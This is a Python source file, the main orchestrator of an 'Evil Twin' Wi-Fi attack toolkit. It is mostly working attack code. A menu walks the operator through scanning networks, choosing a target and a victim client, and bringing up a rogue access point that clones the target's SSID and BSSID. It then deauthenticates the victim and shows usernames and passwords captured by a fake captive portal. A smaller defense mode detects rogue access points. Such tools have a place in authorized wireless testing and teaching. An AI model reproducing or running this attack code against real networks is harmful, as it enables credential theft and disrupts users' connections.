#!/usr/bin/env python3
"""Evil Twin — WLAN Attack & Defense Toolkit (single-wrapper orchestrator).

This is the one entry point the operator runs.  It ties every stage together behind an
interactive `rich` menu and a live status board, so the whole attack can be "conducted" from
one place with continuous situational awareness — no parallel shells, no editing code
between steps.

    sudo python3 eviltwin.py

The orchestrator owns hardware setup (adapter selection + monitor mode) and the shared
:data:`core.state.STATE`; each stage is implemented in its own module under ``attack/`` and
``defense/`` and is invoked from the menu here.
"""

from __future__ import annotations

import sys
from typing import List, Optional

from core import interfaces, sysutils, ui
from core.state import STATE, Stage, StageStatus
from attack.scanner import WiFiScanner
from attack.clients import ClientSniffer
from attack.rogue_ap import RogueAP
from attack.portal.server import PortalServer, lease_mac_lookup
from attack.deauth import DeauthAttacker
from defense.detector import EvilTwinDetector
from defense.defender import AlertLogger, ProtectiveCounter

# System utilities the tool relies on.  ``iw``/``ip`` are needed from the start; the rest
# are only needed once you launch the Evil Twin, so they are checked but not fatal upfront.
REQUIRED_TOOLS = ["iw", "ip"]
OPTIONAL_TOOLS = ["hostapd", "dnsmasq", "iptables", "iwconfig"]


class Orchestrator:
    """Drives the full attack/defense workflow from a single interactive session."""

    def __init__(self) -> None:
        self.scan_duration = 60     # spec: ~one-minute discovery scan
        self.rogue_ap: Optional[RogueAP] = None
        self.portal: Optional[PortalServer] = None
        self.deauth: Optional[DeauthAttacker] = None

    # ------------------------------------------------------------------
    # Startup / hardware setup
    # ------------------------------------------------------------------

    def preflight(self) -> bool:
        """Check privileges and dependencies before doing anything."""
        if not sysutils.is_root():
            ui.error("Root privileges are required (try: sudo python3 eviltwin.py).")
            return False

        missing = sysutils.check_dependencies(REQUIRED_TOOLS)
        if missing:
            ui.error(f"Missing required tools: {', '.join(missing)}")
            return False

        missing_opt = sysutils.check_dependencies(OPTIONAL_TOOLS)
        if missing_opt:
            ui.warn(
                "Optional tools missing (needed for later stages): "
                + ", ".join(missing_opt)
            )
        return True

    def setup_interfaces(self) -> bool:
        """Detect adapters and assign monitor + AP roles (auto-detect, two or one)."""
        adapters = interfaces.list_interfaces()
        if not adapters:
            ui.error("No wireless interfaces found. Is an adapter connected / passed "
                     "through to the VM?")
            return False

        ui.info("Available wireless adapters:")
        for i, a in enumerate(adapters, start=1):
            ui.console.print(f"  [bold]{i}[/bold]. {a}  driver={a.driver or '?'} "
                             f"mode={a.mode}")

        monitor_candidates = [a for a in adapters if a.monitor_capable]
        if not monitor_candidates:
            ui.error("No adapter advertises monitor mode — scanning and deauth need it.")
            return False

        # Choose the monitor-mode adapter (for scanning + deauth).
        mon = ui.select_from(
            monitor_candidates,
            lambda items: _adapter_table(items, "Pick the MONITOR adapter (scan + deauth)"),
            prompt="Monitor adapter # (0 to cancel)",
        )
        if mon is None:
            return False

        # Choose the AP adapter.  Prefer a *second*, AP-capable adapter; otherwise fall
        # back to single-adapter mode-sharing on the same one.
        ap_candidates = [a for a in adapters if a.ap_capable and a.name != mon.name]
        if ap_candidates:
            ap = ui.select_from(
                ap_candidates,
                lambda items: _adapter_table(items, "Pick the AP adapter (Evil Twin)"),
                prompt="AP adapter # (0 = reuse the monitor adapter)",
            )
            if ap is None:
                ap = mon
        else:
            ui.warn("Only one usable adapter — running in single-adapter mode "
                    "(the AP and deauth/scan will time-share it).")
            ap = mon

        STATE.monitor_iface = mon.name
        STATE.ap_iface = ap.name
        STATE.single_adapter = (mon.name == ap.name)

        # Put the monitor adapter into monitor mode now.
        try:
            interfaces.set_monitor_mode(mon.name)
            ui.success(f"{mon.name} is in monitor mode.")
        except sysutils.CommandError as exc:
            ui.error(f"Failed to enable monitor mode on {mon.name}: {exc}")
            return False

        STATE.log(
            f"Interfaces ready — monitor={STATE.monitor_iface}, ap={STATE.ap_iface}, "
            f"single_adapter={STATE.single_adapter}",
            level="good",
        )
        return True

    # ------------------------------------------------------------------
    # Stage 1 — Network discovery
    # ------------------------------------------------------------------

    def stage_scan(self) -> None:
        if not STATE.monitor_iface:
            ui.error("No monitor interface set up.")
            return
        duration = self.scan_duration
        ans = ui.ask_text(f"Scan duration in seconds", default=str(duration))
        if ans.isdigit() and int(ans) > 0:
            duration = int(ans)

        STATE.networks.clear()
        scanner = WiFiScanner(STATE.monitor_iface)
        ui.info(f"Scanning for {duration}s — channel hopping, passive capture…")

        # Live-updating table while the scan thread runs.
        ui.run_with_live_table(
            worker=lambda: scanner.scan(duration=duration),
            render=lambda: ui.networks_table(STATE.sorted_networks()),
            extra=ui.events_panel,
        )
        ui.success(f"Discovery complete: {len(STATE.networks)} network(s).")

    # ------------------------------------------------------------------
    # Stage 2 — Target selection
    # ------------------------------------------------------------------

    def stage_select_target(self) -> None:
        nets = STATE.sorted_networks()
        if not nets:
            ui.warn("No networks discovered yet — run a scan first.")
            return
        chosen = ui.select_from(
            nets,
            lambda items: ui.networks_table(items),
            prompt="Target network # (0 to cancel)",
        )
        if chosen is None:
            return
        STATE.target = chosen
        STATE.set_stage(Stage.TARGET, StageStatus.DONE)
        STATE.clear_clients()  # client list is per-target
        ui.success(f"Target set: {chosen.ssid} ({chosen.bssid}) on channel "
                   f"{chosen.channel}, security {chosen.security}.")
        STATE.log(f"Target selected: {chosen.ssid} / {chosen.bssid}", level="good")

    # ------------------------------------------------------------------
    # Stages 3-6 + defense — wired in later build steps
    # ------------------------------------------------------------------

    def stage_identify_victim(self) -> None:
        if not STATE.target:
            ui.warn("Select a target network first (Stage 2).")
            return
        if not STATE.monitor_iface:
            ui.error("No monitor interface set up.")
            return

        duration = 30
        ans = ui.ask_text("Client-discovery duration in seconds", default=str(duration))
        if ans.isdigit() and int(ans) > 0:
            duration = int(ans)

        STATE.clear_clients()
        sniffer = ClientSniffer(
            STATE.monitor_iface, STATE.target.bssid, STATE.target.channel
        )
        ui.info(f"Listening on channel {STATE.target.channel} for clients of "
                f"{STATE.target.ssid}…")
        ui.run_with_live_table(
            worker=lambda: sniffer.find_clients(duration=duration),
            render=lambda: ui.clients_table(STATE.sorted_clients()),
            extra=ui.events_panel,
        )

        clients = STATE.sorted_clients()
        if not clients:
            ui.warn("No active clients seen. Try a longer scan or a busier time.")
            return
        chosen = ui.select_from(
            clients,
            lambda items: ui.clients_table(items),
            prompt="Victim client # (0 to cancel)",
        )
        if chosen is None:
            return
        STATE.victim = chosen
        STATE.set_stage(Stage.VICTIM, StageStatus.DONE)
        ui.success(f"Victim set: {chosen.mac} ({chosen.vendor or 'unknown vendor'}).")
        STATE.log(f"Victim selected: {chosen.mac}", level="good")

    def stage_evil_twin(self) -> None:
        if not STATE.target:
            ui.warn("Select a target network first (Stage 2).")
            return
        if STATE.target.ssid in ("", "<hidden>"):
            ui.warn("Target SSID is hidden/unknown — cannot clone it convincingly.")
            return
        if self.rogue_ap and self.rogue_ap.running:
            ui.info("Evil Twin is already running.")
            self._show_twin_clients()
            return

        if STATE.single_adapter:
            ui.warn("Single-adapter mode: starting the AP takes the adapter out of "
                    "monitor mode, so scanning/deauth pause while the twin is up.")
            if not ui.confirm("Continue?", default=True):
                return

        clone = ui.confirm("Clone the target's BSSID (appear identical at L2)?",
                           default=True)
        self.rogue_ap = RogueAP(
            ap_iface=STATE.ap_iface,
            ssid=STATE.target.ssid,
            channel=STATE.target.channel or 6,
            bssid=STATE.target.bssid,
            clone_bssid=clone,
        )
        ui.info("Bringing up the Evil Twin (hostapd + dnsmasq + iptables)…")
        if not self.rogue_ap.start():
            ui.error("Evil Twin failed to start — check captured/hostapd.log and "
                     "captured/dnsmasq.log.")
            return
        ui.success(f"Evil Twin '{STATE.target.ssid}' is live on {STATE.ap_iface}.")

        # The captive portal is part of the network's services — bring it up with the AP.
        self._start_portal()
        self._show_twin_clients()

    def _start_portal(self) -> None:
        if self.portal and self.portal.running:
            return
        port = self.rogue_ap.cfg.portal_port if self.rogue_ap else 80
        lease_file = self.rogue_ap.cfg.lease_file if self.rogue_ap else ""
        self.portal = PortalServer(
            ssid=STATE.target.ssid,
            host="0.0.0.0",
            port=port,
            mac_lookup=lease_mac_lookup(lease_file) if lease_file else None,
        )
        if self.portal.start():
            sysutils.register_cleanup(self.portal.stop)
            ui.success(f"Captive portal serving the login page on port {port}.")
        else:
            ui.error("Captive portal failed to start (is port 80 already in use?).")

    def _show_twin_clients(self) -> None:
        """Briefly show who has joined the Evil Twin (DHCP leases)."""
        if not (self.rogue_ap and self.rogue_ap.running):
            return
        if not ui.confirm("Watch for clients joining the twin? (Ctrl-C to stop)",
                          default=False):
            return
        from rich.table import Table

        def render() -> Table:
            t = Table(title="Clients joined the Evil Twin", expand=True)
            t.add_column("IP", style="cyan")
            t.add_column("MAC", style="magenta")
            t.add_column("Hostname")
            for ip, mac, host in self.rogue_ap.connected_clients():
                t.add_row(ip, mac, host)
            return t

        import time as _t

        try:
            from rich.live import Live

            with Live(console=ui.console, refresh_per_second=2, screen=False) as live:
                while True:
                    live.update(render())
                    _t.sleep(0.5)
        except KeyboardInterrupt:
            ui.info("Stopped watching twin clients.")

    def stage_deauth(self) -> None:
        # Toggle: if already running, offer to stop it.
        if self.deauth and self.deauth.running:
            ui.info(f"Deauth is running against {self.deauth.victim} "
                    f"({self.deauth.sent} frames sent).")
            if ui.confirm("Stop the targeted disconnection?", default=True):
                self.deauth.stop()
                ui.success("Targeted disconnection stopped.")
            return

        if not STATE.target:
            ui.warn("Select a target network first (Stage 2).")
            return
        if not STATE.victim:
            ui.warn("Identify a victim client first (Stage 3).")
            return
        if not STATE.monitor_iface:
            ui.error("No monitor interface set up.")
            return
        if STATE.single_adapter and self.rogue_ap and self.rogue_ap.running:
            ui.warn("Single-adapter mode: the adapter is busy running the Evil Twin, so it "
                    "cannot inject deauth at the same time. Use two adapters for the full "
                    "attack, or stop the twin first.")
            return

        self.deauth = DeauthAttacker(
            iface=STATE.monitor_iface,
            bssid=STATE.target.bssid,
            victim_mac=STATE.victim.mac,
            channel=STATE.target.channel,
        )
        if self.deauth.start():
            ui.success(f"Deauthenticating {STATE.victim.mac} from {STATE.target.ssid} "
                       "(only this client). It runs in the background — re-select this "
                       "menu item to stop.")
        else:
            ui.error("Failed to start targeted disconnection.")

    def show_credentials(self) -> None:
        from rich.table import Table
        import time as _t

        if not (self.portal and self.portal.running):
            ui.warn("Captive portal is not running — start the Evil Twin (Stage 4) first.")
        creds = STATE.credentials
        if not creds:
            ui.info("No credentials captured yet. The portal is "
                    f"{'running' if (self.portal and self.portal.running) else 'offline'}.")
            return
        table = Table(title=f"Captured Credentials ({len(creds)})", expand=True)
        table.add_column("#", justify="right", style="bold")
        table.add_column("Time")
        table.add_column("Username", style="green")
        table.add_column("Password", style="green")
        table.add_column("Client IP", style="cyan")
        table.add_column("Client MAC", style="magenta")
        for i, c in enumerate(creds, start=1):
            ts = _t.strftime("%H:%M:%S", _t.localtime(c.timestamp))
            table.add_row(str(i), ts, c.username, c.password, c.client_ip,
                          c.client_mac or "?")
        ui.console.print(table)
        ui.info("Stored at captured/credentials.txt and captured/credentials.json")

    def defense_mode(self) -> None:
        from rich.table import Table

        if not STATE.monitor_iface:
            ui.error("No monitor interface set up.")
            return
        if STATE.single_adapter and (self.rogue_ap and self.rogue_ap.running):
            ui.warn("Single-adapter mode: stop the Evil Twin before running defense "
                    "(the adapter can't both run the AP and monitor the air).")
            return

        duration = 60
        ans = ui.ask_text("Defense monitor duration in seconds (min 10)",
                          default=str(duration))
        if ans.isdigit() and int(ans) >= 10:
            duration = int(ans)

        detector = EvilTwinDetector(STATE.monitor_iface)
        logger = AlertLogger()
        ui.info("Watching the air for Evil Twin indicators (BSSID/fingerprint/signal "
                "anomalies + deauth floods)…")

        def render() -> Table:
            t = Table(title=f"Defense Alerts ({len(detector.alerts)})", expand=True)
            t.add_column("Severity")
            t.add_column("Type", style="bold")
            t.add_column("SSID", style="cyan")
            t.add_column("BSSID", style="magenta")
            t.add_column("Detail")
            for a in detector.alerts[-15:]:
                sev = ("[bold red]HIGH[/bold red]" if a.severity == "high"
                       else "[yellow]warn[/yellow]")
                t.add_row(sev, a.kind, a.ssid or "—", a.bssid or "—", a.detail)
            logger.flush(detector.alerts)  # persist as we go
            return t

        ui.run_with_live_table(
            worker=lambda: detector.monitor(duration=duration),
            render=render,
            extra=ui.events_panel,
        )
        logger.flush(detector.alerts)

        if not detector.alerts:
            ui.success("No Evil Twin indicators detected during the monitoring window.")
            return
        ui.warn(f"{len(detector.alerts)} alert(s) raised — logged to "
                "captured/defense_alerts.log")

        # Offer the opt-in, non-disruptive active counter against a confirmed rogue.
        rogue_bssids = sorted({a.bssid for a in detector.alerts
                               if a.kind in ("ROGUE_BSSID", "SECURITY_DOWNGRADE") and a.bssid})
        if rogue_bssids and ui.confirm(
            "Engage active counter to kick clients off a rogue AP "
            "(rogue only — real network untouched)?", default=False
        ):
            self._engage_counter(rogue_bssids)

    def _engage_counter(self, rogue_bssids) -> None:
        from rich.table import Table

        def render(items):
            t = Table(title="Confirmed rogue BSSIDs", expand=True)
            t.add_column("#", justify="right", style="bold")
            t.add_column("BSSID", style="magenta")
            for i, b in enumerate(items, start=1):
                t.add_row(str(i), b)
            return t

        choice = ui.select_from(rogue_bssids, render,
                                prompt="Rogue BSSID to counter # (0 to cancel)")
        if not choice:
            return
        channel = STATE.target.channel if STATE.target else None
        counter = ProtectiveCounter(STATE.monitor_iface, choice, channel=channel)
        if counter.start():
            ui.success(f"Active counter running against {choice}. Press Enter to stop.")
            try:
                ui.ask_text("", default="")
            finally:
                counter.stop()
                ui.info(f"Counter stopped ({counter.sent} frames sent).")

    # ------------------------------------------------------------------
    # Main loop
    # ------------------------------------------------------------------

    def main_menu(self) -> None:
        options = [
            "Stage 1 — Scan for networks (discovery)",
            "Stage 2 — Select target network",
            "Stage 3 — Identify victim client",
            "Stage 4 — Start Evil Twin AP",
            "Stage 5 — Targeted disconnection (deauth)",
            "Stage 6 — View captured credentials",
            "Defense mode — detect Evil Twin attacks",
            "Show status board",
            "Quit",
        ]
        actions = [
            self.stage_scan,
            self.stage_select_target,
            self.stage_identify_victim,
            self.stage_evil_twin,
            self.stage_deauth,
            self.show_credentials,
            self.defense_mode,
            lambda: ui.console.print(ui.stage_panel()),
        ]
        while True:
            ui.console.print()
            ui.console.print(ui.stage_panel())
            idx = ui.menu("Main Menu", options)
            if idx == len(options) - 1:  # Quit
                if ui.confirm("Quit and tear down everything?", default=True):
                    break
                continue
            try:
                actions[idx]()
            except KeyboardInterrupt:
                ui.warn("Interrupted — returning to menu.")
            except sysutils.CommandError as exc:
                ui.error(str(exc))


def _adapter_table(items, title: str):
    from rich.table import Table

    table = Table(title=title, expand=True)
    table.add_column("#", justify="right", style="bold")
    table.add_column("Interface", style="cyan")
    table.add_column("PHY")
    table.add_column("MAC")
    table.add_column("Monitor")
    table.add_column("AP")
    for i, a in enumerate(items, start=1):
        table.add_row(
            str(i), a.name, a.phy, a.mac,
            "✔" if a.monitor_capable else "—",
            "✔" if a.ap_capable else "—",
        )
    return table


def main() -> int:
    sysutils.install_signal_handlers()
    ui.banner()

    orch = Orchestrator()
    if not orch.preflight():
        return 1
    if not orch.setup_interfaces():
        return 1

    try:
        orch.main_menu()
    finally:
        ui.info("Cleaning up (restoring interfaces, stopping services)…")
        sysutils.cleanup_all()
        ui.success("Done. Goodbye.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
